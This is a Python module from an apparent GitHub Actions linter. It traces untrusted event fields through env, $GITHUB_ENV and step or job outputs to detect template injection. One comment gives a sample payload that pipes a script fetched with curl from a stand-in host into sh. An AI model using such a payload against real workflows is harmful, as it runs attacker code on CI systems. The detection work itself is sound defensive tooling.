"""Following untrusted values through ``env:``, ``$GITHUB_ENV`` and step/job outputs (WG004).

Putting ``${{ github.event.pull_request.title }}`` straight into ``run:`` is the obvious form of
template injection. The same value can also take a detour and still end up pasted into a script:

    env:
      TITLE: ${{ github.event.pull_request.title }}      # job level
    steps:
      - id: meta
        run: echo "title=$TITLE" >> "$GITHUB_OUTPUT"     # safe here: a shell variable
      - run: echo "${{ steps.meta.outputs.title }}"      # injection, two hops later

``Tracker`` walks the steps of each job in order, like the runner does, and remembers which
values are *tainted* (carry untrusted text) and how they got there:

- ``env:`` at workflow, job and step level; a lower level that sets the same name to a clean
  value removes the taint;
- ``NAME=value >> $GITHUB_ENV`` in a ``run:`` script (later steps of the job see ``NAME``);
- ``name=value >> $GITHUB_OUTPUT`` in a step with an ``id`` (``steps.<id>.outputs.<name>``);
- job ``outputs:``, read by other jobs as ``needs.<job>.outputs.<name>``.

A value is tainted if one of its ``${{ }}`` expressions is, or (in a script) if it uses a shell
variable that holds a tainted ``env`` value.
"""

from __future__ import annotations

import re
from collections.abc import Iterator
from dataclasses import dataclass, field, replace

from yaml.nodes import MappingNode, Node

from .expressions import (
    ContextPath,
    Expression,
    ExpressionError,
    context_paths,
    find_expressions,
    is_ancestor,
    matches,
)
from .model import Severity
from .project import call_site, file_key
from .workflow import Step, Workflow, get, items, scalar
from .writes import ENV, OUTPUT, PATH, assignments, github_script_calls, shell_writes

# Context values an outsider controls: titles, bodies, branch names, commit messages...
# Placed straight into a shell script, "a`; curl evil.sh | sh`" in a PR title runs as code.
# Paths as context_paths() returns them: lower case, "*" for any array element.
UNTRUSTED: tuple[tuple[str, ...], ...] = tuple(
    tuple(p.split("."))
    for p in (
        "github.head_ref",
        "github.event.issue.title",
        "github.event.issue.body",
        "github.event.pull_request.title",
        "github.event.pull_request.body",
        "github.event.pull_request.head.ref",
        "github.event.pull_request.head.label",
        "github.event.pull_request.head.repo.default_branch",
        "github.event.comment.body",
        "github.event.review.body",
        "github.event.review_comment.body",
        "github.event.discussion.title",
        "github.event.discussion.body",
        "github.event.pages.*.page_name",
        "github.event.commits.*.message",
        "github.event.commits.*.author.email",
        "github.event.commits.*.author.name",
        "github.event.head_commit.message",
        "github.event.head_commit.author.email",
        "github.event.head_commit.author.name",
        "github.event.workflow_run.head_branch",
        "github.event.workflow_run.head_commit.message",
        "github.event.workflow_run.head_commit.author.email",
        "github.event.workflow_run.head_commit.author.name",
    )
)

OUTSIDER = "outsider"
"""A context field anyone can set, such as a pull request title."""
TOJSON = "tojson"
"""``toJSON()`` of an object that contains such a field."""
INPUT = "input"
"""An input of a composite action or reusable workflow whose callers aren't known: any of them
may pass untrusted text."""

_SAFE_INPUT_TYPES = ("boolean", "number")
"""``workflow_call`` input types that can't carry text."""


@dataclass(frozen=True)
class Taint:
    kind: str
    """``OUTSIDER``, ``TOJSON`` or ``INPUT``."""
    source: str
    """Where the text comes from, e.g. ``github.event.pull_request.title``."""
    severity: Severity
    example: str = ""
    """For ``TOJSON``: one untrusted field inside the object."""
    via: tuple[str, ...] = ()
    """The detour, oldest first, e.g. ``("env.TITLE (job 'test')", "steps.meta.outputs.title")``."""
    callers: tuple[str, ...] = ()
    """For an input of a reusable workflow or action: the *other* local callers that pass
    untrusted text into it too (``via`` shows the worst one), e.g.
    ``"with.title in .github/workflows/b.yml (job 'call') ('github.event.issue.title')"``."""

    def through(self, hop: str) -> Taint:
        return replace(self, via=(*self.via, hop))


def merge_callers(taints: list[Taint]) -> Taint:
    """One input's taint from several callers: the worst one (the first of equals) with every
    other caller listed in ``callers``, highest severity first, without duplicates."""
    ordered = sorted(taints, key=lambda t: -t.severity)  # stable: callers keep file order
    worst, others = ordered[0], ordered[1:]
    listed = list(worst.callers)
    for taint in others:
        hop = taint.via[-1] if taint.via else taint.source
        for entry in (f"{hop} ('{taint.source}')", *taint.callers):
            if entry not in listed:
                listed.append(entry)
    return replace(worst, callers=tuple(listed))


def direct_taint(path: ContextPath) -> Taint | None:
    """The taint of a context path on its own, without looking at env, outputs or inputs."""
    if any(matches(path.segments, pattern) for pattern in UNTRUSTED):
        return Taint(OUTSIDER, str(path), Severity.HIGH)
    if path.function == "tojson":
        inside = next((p for p in UNTRUSTED if is_ancestor(path.segments, p)), None)
        if inside is not None:
            return Taint(TOJSON, str(path), Severity.HIGH, example=".".join(inside))
    return None


@dataclass
class Scope:
    """What is tainted at one point of a job."""

    env: dict[str, Taint] = field(default_factory=dict)
    """Environment variables by their exact name (shell variables are case-sensitive)."""
    outputs: dict[tuple[str, str], Taint] = field(default_factory=dict)
    """``(step id, output name)``, both lower case (expressions ignore case)."""

    def copy(self) -> Scope:
        return Scope(dict(self.env), dict(self.outputs))

    def env_by_expression(self, name: str) -> tuple[str, Taint] | None:
        """``env.<name>`` in an expression: property names ignore case there."""
        for key, taint in self.env.items():
            if key.lower() == name:
                return key, taint
        return None


_SHELL_VAR = re.compile(r"\$\{?([A-Za-z_]\w*)")
# In github-script: the event payload (= github.event) and environment variables.
_JS_PAYLOAD = re.compile(
    r"""context\.payload(?P<rest>(?:\.[A-Za-z_]\w*|\[\s*(?:\d+|'[^']*'|"[^"]*")\s*\])+)"""
)
_JS_SEGMENT = re.compile(
    r"""\.(?P<name>[A-Za-z_]\w*)|\[\s*(?:(?P<index>\d+)|'(?P<sq>[^']*)'|"(?P<dq>[^"]*)")\s*\]"""
)
_JS_ENV = re.compile(r"""process\.env(?:\.(?P<name>[A-Za-z_]\w*)|\[\s*['"](?P<key>[^'"]+)['"]\s*\])""")


@dataclass(frozen=True)
class FileWrite:
    """A line of a ``run:`` script that appends tainted text to $GITHUB_ENV or $GITHUB_PATH."""

    line: int
    """Index of the line within the script (0 = first)."""
    file: str
    """``ENV`` or ``PATH``."""
    taint: Taint
    key: str = "run"
    """Where the script is: ``run`` or ``script`` (actions/github-script's ``with.script``)."""


@dataclass(frozen=True)
class TrackedStep:
    step: Step
    scope: Scope
    """What is tainted while this step runs (its own env: included)."""
    writes: list[FileWrite] = field(default_factory=list)
    """Tainted text this step's script appends to $GITHUB_ENV / $GITHUB_PATH."""


_CALLER = object()
"""Default for ``Tracker(inputs=...)``: what the file's local callers pass (``input_taints``)."""


class Tracker:
    def __init__(
        self,
        wf: Workflow,
        inputs: dict[str, Taint] | None | object = _CALLER,
        stack: frozenset[str] = frozenset(),
    ) -> None:
        """``inputs``: the taint of each input for one particular call (used to follow that
        call's outputs back to the caller); by default the merged ``wf.input_taints``.
        ``stack``: files being walked further up, to stop at a loop of calls."""
        self.wf = wf
        self._inputs = wf.input_taints if inputs is _CALLER else inputs
        self._stack = stack | {file_key(wf.path)}
        self._jobs = {job_id.lower(): (job_id, job) for job_id, job in wf.jobs()}
        self._walked: dict[str, tuple[list[TrackedStep], dict[str, Taint]]] = {}
        self._walking: set[str] = set()
        self._action: tuple[list[TrackedStep], Scope] | None = None

    # --- public -----------------------------------------------------------------------------

    def steps(self) -> Iterator[TrackedStep]:
        """Every step with what is tainted while it runs, in workflow order."""
        if self.wf.is_action:
            yield from self._walk_action()[0]
            return
        for key in self._jobs:
            yield from self._walk_job(key)[0]

    def outputs(self) -> dict[str, Taint]:
        """Tainted outputs (lower-case names) of an action (``outputs.<name>.value``) or a
        reusable workflow (``on.workflow_call.outputs.<name>.value``), as its caller sees them."""
        if self.wf.is_action:
            declared, scope = get(self.wf.root, "outputs"), self._walk_action()[1]
        else:
            declared, scope = get(get(get(self.wf.root, "on"), "workflow_call"), "outputs"), Scope()
        found: dict[str, Taint] = {}
        for name, node in items(declared):
            text = scalar(get(node, "value"))
            if text is not None and (taint := self._taint_of_text(text, scope)) is not None:
                found[name.lower()] = taint.through(f"outputs.{name} of {self.wf.path}")
        return found

    def with_taints(self, with_node: Node | None, scope: Scope, where: str) -> dict[str, Taint]:
        """The tainted ``with:`` values of a call (lower-case names), each with the hop
        ``with.<name> in <where>``."""
        found: dict[str, Taint] = {}
        for name, value in items(with_node):
            text = scalar(value)
            if text is not None and (taint := self.taint_of_value(text, scope)) is not None:
                found[name.lower()] = taint.through(f"with.{name} in {where}")
        return found

    def taint_of_value(self, text: str, scope: Scope | None = None) -> Taint | None:
        """The taint of a ``with:`` value: of a step, seen with that step's ``scope``, or of a
        job that calls a reusable workflow (no scope: ``needs``, ``inputs`` and ``github`` only)."""
        return self._taint_of_text(text, scope or Scope())

    def taint_of_expression(self, expr: Expression, scope: Scope) -> tuple[ContextPath, Taint] | None:
        """The first tainted path in one expression, with its taint."""
        for path in _paths(expr):
            if (taint := self._taint_of_path(path, scope)) is not None:
                return path, taint
        return None

    # --- values -----------------------------------------------------------------------------

    def _taint_of_path(self, path: ContextPath, scope: Scope) -> Taint | None:
        seg = path.segments
        if seg[0] == "inputs" and len(seg) >= 2 and (self.wf.is_action or self.wf.is_reusable):
            return self._caller_input(path)
        if (taint := direct_taint(path)) is not None:
            return taint
        if seg[0] == "env" and len(seg) >= 2 and (found := scope.env_by_expression(seg[1])):
            return found[1]
        if seg[0] == "steps" and len(seg) >= 4 and seg[2] == "outputs":
            return scope.outputs.get((seg[1], seg[3]))
        if seg[0] in ("needs", "jobs") and len(seg) >= 4 and seg[2] == "outputs" and not self.wf.is_action:
            return self._walk_job(seg[1])[1].get(seg[3]) if seg[1] in self._jobs else None
        return None

    def _caller_input(self, path: ContextPath) -> Taint | None:
        """``inputs.<name>`` of a composite action or reusable workflow: what the known local
        callers pass in. With no caller among the checked files, possibly anything: a caller
        may pass a pull request title straight through, and the callee can't know."""
        name = path.segments[1]
        if self._inputs is not None:
            return self._inputs.get(name)
        if self.wf.input_type(name) in _SAFE_INPUT_TYPES:
            return None
        return Taint(INPUT, str(path), Severity.MEDIUM)

    def _taint_of_text(self, text: str, scope: Scope) -> Taint | None:
        for expr in find_expressions(text):
            if (hit := self.taint_of_expression(expr, scope)) is not None:
                return hit[1]
        return None

    def _taint_of_shell(self, text: str, scope: Scope) -> Taint | None:
        """Like _taint_of_text, plus ``$NAME`` / ``${NAME}`` of a tainted environment variable."""
        if (taint := self._taint_of_text(text, scope)) is not None:
            return taint
        for match in _SHELL_VAR.finditer(text):
            if (taint := scope.env.get(match.group(1))) is not None:
                return taint
        return None

    def _apply_env(self, node: Node | None, scope: Scope, where: str) -> None:
        """Apply an ``env:`` mapping to ``scope``: tainted values in, clean ones out."""
        if not isinstance(node, MappingNode):
            return
        values = [(name, scalar(value)) for name, value in items(node)]
        before = scope.copy()  # the values of one env: block can't see each other
        for name, value in values:
            taint = self._taint_of_text(value, before) if value is not None else None
            if taint is None:
                scope.env.pop(name, None)
            else:
                scope.env[name] = taint.through(f"env.{name} ({where})")

    # --- walking ----------------------------------------------------------------------------

    def _walk_job(self, key: str) -> tuple[list[TrackedStep], dict[str, Taint]]:
        """The steps of one job and its tainted outputs; cached, and safe against needs: loops."""
        if key in self._walked:
            return self._walked[key]
        if key in self._walking:
            return [], {}
        self._walking.add(key)
        job_id, job = self._jobs[key]
        scope = Scope()
        self._apply_env(get(self.wf.root, "env"), scope, "workflow")
        self._apply_env(get(job, "env"), scope, f"job '{job_id}'")
        steps = [s for s in self.wf.steps() if s.job_id == job_id]
        tracked, final = self._walk_steps(steps, scope, f"job '{job_id}'")
        outputs: dict[str, Taint] = {}
        for name, value in items(get(job, "outputs")):
            text = scalar(value)
            if text is not None and (taint := self._taint_of_text(text, final)) is not None:
                outputs[name.lower()] = taint.through(f"needs.{job_id}.outputs.{name}")
        for name, taint in self._called_outputs(
            job, None, Scope(), f"{self.wf.path} (job '{job_id}')"
        ).items():
            outputs[name] = taint.through(f"needs.{job_id}.outputs.{name}")
        self._walking.discard(key)
        self._walked[key] = (tracked, outputs)
        return tracked, outputs

    def _walk_steps(self, steps: list[Step], scope: Scope, where: str) -> tuple[list[TrackedStep], Scope]:
        tracked: list[TrackedStep] = []
        for number, step in enumerate(steps, start=1):
            step_id = scalar(get(step.node, "id"))
            label = f"step '{step_id}'" if step_id else f"step {number} of {where}"
            own = scope.copy()
            self._apply_env(get(step.node, "env"), own, label)
            current = TrackedStep(step, own)
            tracked.append(current)
            run = scalar(get(step.node, "run"))
            if run is not None:
                self._apply_shell_writes(run, own, scope, current, step_id, label)
            script = scalar(get(get(step.node, "with"), "script"))
            if script is not None and (step.uses or "").startswith("actions/github-script@"):
                self._apply_script_calls(script, own, scope, current, step_id, label)
            if step_id:
                self._apply_action_outputs(step, step_id, own, scope)
        return tracked, scope

    def _walk_action(self) -> tuple[list[TrackedStep], Scope]:
        if self._action is None:
            self._action = self._walk_steps(list(self.wf.steps()), Scope(), "the action")
        return self._action

    def _called_outputs(
        self, node: MappingNode, step: Step | None, scope: Scope, where: str
    ) -> dict[str, Taint]:
        """Outputs of the local reusable workflow (job ``node``) or local action (``step``)
        that ``node`` runs, worked out for this call's own ``with:`` values."""
        project = self.wf.project
        if project is None:
            return {}
        uses = scalar(get(node, "uses"))
        callee = project.local_action(self.wf, uses) if step else project.reusable_workflow(self.wf, uses)
        if callee is None or file_key(callee.path) in self._stack:
            return {}
        inputs = self.with_taints(get(node, "with"), scope, where)
        return Tracker(callee, inputs, self._stack).outputs()

    def _apply_action_outputs(self, step: Step, step_id: str, own: Scope, scope: Scope) -> None:
        """After a step that runs a local action: its tainted outputs, as ``steps.<id>.outputs.*``."""
        where = call_site(self.wf, get(step.node, "uses"))
        for name, taint in self._called_outputs(step.node, step, own, where).items():
            scope.outputs[(step_id.lower(), name)] = taint.through(f"steps.{step_id}.outputs.{name}")

    def _apply_shell_writes(
        self, run: str, own: Scope, scope: Scope, current: TrackedStep, step_id: str | None, label: str
    ) -> None:
        """What a ``run:`` script appends to $GITHUB_OUTPUT / $GITHUB_ENV / $GITHUB_PATH: outputs
        and env for later steps, and (WG007) tainted text in $GITHUB_ENV / $GITHUB_PATH. ``own``
        is what the script sees, ``scope`` what later steps get."""
        for assignment in assignments(shell_writes(run)):
            hit = next(
                ((w, t) for w in assignment.writes if (t := self._taint_of_shell(w.source, own)) is not None),
                None,
            )
            taint = hit[1] if hit else None
            if hit is not None and assignment.file in (ENV, PATH):
                current.writes.append(FileWrite(hit[0].line, assignment.file, hit[1]))
            self._assign(assignment.file, assignment.name, taint, scope, step_id, label)

    def _apply_script_calls(
        self, script: str, own: Scope, scope: Scope, current: TrackedStep, step_id: str | None, label: str
    ) -> None:
        """The same for ``core.setOutput`` / ``core.exportVariable`` / ``core.addPath``."""
        for call in github_script_calls(script):
            taint = self._taint_of_js(call.argument, own)
            if taint is not None and call.file in (ENV, PATH):
                current.writes.append(FileWrite(call.line, call.file, taint, key="script"))
            self._assign(call.file, call.name, taint, scope, step_id, label)

    @staticmethod
    def _assign(
        file: str, name: str | None, taint: Taint | None, scope: Scope, step_id: str | None, label: str
    ) -> None:
        if name is None:
            return
        if file == ENV:
            if taint is None:
                scope.env.pop(name, None)
            else:
                scope.env[name] = taint.through(f"${name} written to $GITHUB_ENV in {label}")
        elif file == OUTPUT and step_id:
            key = (step_id.lower(), name.lower())
            if taint is None:
                scope.outputs.pop(key, None)
            else:
                scope.outputs[key] = taint.through(f"steps.{step_id}.outputs.{name}")

    def _taint_of_js(self, text: str, scope: Scope) -> Taint | None:
        """A github-script value: ``${{ }}``, ``context.payload.*`` (that is ``github.event.*``)
        and ``process.env.NAME``."""
        if (taint := self._taint_of_text(text, scope)) is not None:
            return taint
        for match in _JS_PAYLOAD.finditer(text):
            segments = ["github", "event"]
            for seg in _JS_SEGMENT.finditer(match["rest"]):
                if seg["index"] is not None:
                    segments.append("*")
                else:
                    segments.append((seg["name"] or seg["sq"] or seg["dq"] or "").lower())
            if (taint := direct_taint(ContextPath(tuple(segments), None))) is not None:
                return taint
        for match in _JS_ENV.finditer(text):
            if (taint := scope.env.get(match["name"] or match["key"])) is not None:
                return taint
        return None


def _paths(expr: Expression) -> list[ContextPath]:
    try:
        return context_paths(expr.inner)
    except ExpressionError:
        return []  # GitHub rejects the workflow before anything runs
